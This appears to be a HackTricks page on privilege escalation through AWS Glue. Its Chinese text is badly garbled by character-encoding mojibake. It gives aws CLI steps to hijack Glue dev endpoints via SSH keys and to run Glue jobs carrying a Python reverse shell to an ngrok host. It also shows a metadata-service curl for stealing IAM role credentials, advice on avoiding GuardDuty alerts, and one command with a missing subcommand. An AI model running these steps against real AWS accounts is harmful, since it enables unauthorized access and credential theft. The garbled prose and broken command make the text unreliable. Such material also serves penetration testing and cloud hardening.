# AWS - Glue æƒé™æå‡

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## glue

### `iam:PassRole`, `glue:CreateDevEndpoint`, (`glue:GetDevEndpoint` | `glue:GetDevEndpoints`)

æ‹¥æœ‰ `iam:PassRole` å’Œ `glue:CreateDevEndpoint` æƒé™çš„æ”»å‡»è€…å¯ä»¥**åˆ›å»ºä¸€ä¸ªæ–°çš„AWS Glueå¼€å‘ç«¯ç‚¹å¹¶å°†ç°æœ‰æœåŠ¡è§’è‰²ä¼ é€’ç»™å®ƒ**ã€‚ç„¶åï¼Œä»–ä»¬å¯ä»¥SSHè¿›å…¥å®ä¾‹ï¼Œå¹¶ä½¿ç”¨AWS CLIæ¥è®¿é—®è¯¥è§’è‰²æ‹¥æœ‰çš„æƒé™ã€‚
```
aws glue create-dev-endpoint --endpoint-name my_dev_endpoint \
--role-arn arn_of_glue_service_role \
--public-key file:///path/to/my/public/ssh/key.pub
```
ç°åœ¨æ”»å‡»è€…åªéœ€**SSH è¿›å…¥å¼€å‘ç«¯ç‚¹**å³å¯è®¿é—®è§’è‰²å‡­è¯ã€‚
```bash
# Get the public address of the instance
## You could also use get-dev-endpoints
aws glue get-dev-endpoint --endpoint-name privesctest

# SSH with the glue user
ssh -i /tmp/private.key ec2-54-72-118-58.eu-west-1.compute.amazonaws.com
```
å³ä½¿åœ¨GuardDutyæ–‡æ¡£ä¸­æ²¡æœ‰ç‰¹åˆ«æŒ‡å‡ºï¼Œä»Glueå®ä¾‹ä¸­æ³„éœ²å‡­è¯ä¹Ÿæ˜¯ä¸€ä¸ªåä¸»æ„ã€‚ç›¸åï¼Œ**åº”è¯¥ç›´æ¥ä»æ–°å®ä¾‹è®¿é—®AWS API**ã€‚

**æ½œåœ¨å½±å“ï¼š**æå‡åˆ°æŒ‡å®šçš„glueæœåŠ¡è§’è‰²æƒé™ã€‚

### `glue:UpdateDevEndpoint`, (`glue:GetDevEndpoint` | `glue:GetDevEndpoints`)

æ‹¥æœ‰**`glue:UpdateDevEndpoint`**æƒé™çš„æ”»å‡»è€…å°†èƒ½å¤Ÿ**æ›´æ–°ç°æœ‰Glueå¼€å‘ç«¯ç‚¹çš„å…³è”SSHå…¬é’¥**ï¼Œç„¶åé€šè¿‡SSHç™»å½•ï¼Œå¹¶è®¿é—®é™„åŠ è§’è‰²æ‰€æ‹¥æœ‰çš„æƒé™ã€‚
```bash
# Change public key to connect
aws glue --endpoint-name target_endpoint \
--public-key file:///path/to/my/public/ssh/key.pub

# Get the public address of the instance
## You could also use get-dev-endpoints
aws glue get-dev-endpoint --endpoint-name privesctest

# SSH with the glue user
ssh -i /tmp/private.key ec2-54-72-118-58.eu-west-1.compute.amazonaws.com
```
æ”»å‡»è€…ç°åœ¨åªéœ€**SSH è¿›å…¥å¼€å‘ç«¯ç‚¹ä»¥è®¿é—®è§’è‰²å‡­è¯**ã€‚åº”ç›´æ¥ä»æ–°å®ä¾‹è®¿é—® AWS APIï¼Œä»¥é¿å…è§¦å‘è­¦æŠ¥ã€‚

**æ½œåœ¨å½±å“ï¼š**æå‡è‡³ä½¿ç”¨çš„ glue æœåŠ¡è§’è‰²æƒé™ã€‚

### `iam:PassRole`, (`glue:CreateJob` | `glue:UpdateJob`), (`glue:StartJobRun` | `glue:CreateTrigger`)

æ‹¥æœ‰è¿™äº›æƒé™çš„æ”»å‡»è€…å¯ä»¥**åˆ›å»º/æ›´æ–°ä½œä¸šï¼Œé™„åŠ ä»»ä½• glue æœåŠ¡è´¦æˆ·**å¹¶å¯åŠ¨å®ƒã€‚ä½œä¸šå¯ä»¥æ‰§è¡Œä»»æ„ python ä»£ç ï¼Œå› æ­¤å¯ä»¥è·å¾—åå‘ shellï¼Œå¹¶ç”¨æ¥**çªƒå–é™„åŠ è§’è‰²çš„ IAM å‡­è¯**ã€‚
```bash
# Content of the python script saved in s3:
#import socket,subprocess,os
#s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#s.connect(("2.tcp.ngrok.io",11216))
#os.dup2(s.fileno(),0)
#os.dup2(s.fileno(),1)
#os.dup2(s.fileno(),2)
#p=subprocess.call(["/bin/sh","-i"])
#To get the IAM Role creds run: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy


# A Glue role with admin access was created
aws glue create-job \
--name privesctest \
--role arn:aws:iam::93424712358:role/GlueAdmin \
--command '{"Name":"pythonshell", "PythonVersion": "3", "ScriptLocation":"s3://airflow2123/rev.py"}'

# You can directly start the job
aws glue start-job-run --job-name privesctest
# Or you can create a trigger to start it
aws glue create-trigger --name triggerprivesc --type SCHEDULED \
--actions '[{"JobName": "privesctest"}]' --start-on-creation \
--schedule "0/5 * * * * *"  #Every 5mins, feel free to change
```
**æ½œåœ¨å½±å“ï¼š** æå‡è‡³æŒ‡å®šçš„glueæœåŠ¡è§’è‰²æƒé™ã€‚

### `glue:UpdateJob`

ä»…å‡­æ›´æ–°æƒé™ï¼Œæ”»å‡»è€…å°±èƒ½çªƒå–å·²é™„åŠ è§’è‰²çš„IAMå‡­è¯ã€‚

**æ½œåœ¨å½±å“ï¼š** æå‡è‡³é™„åŠ çš„glueæœåŠ¡è§’è‰²æƒé™ã€‚

## å‚è€ƒèµ„æ–™

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä»¥PDFæ ¼å¼ä¸‹è½½HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
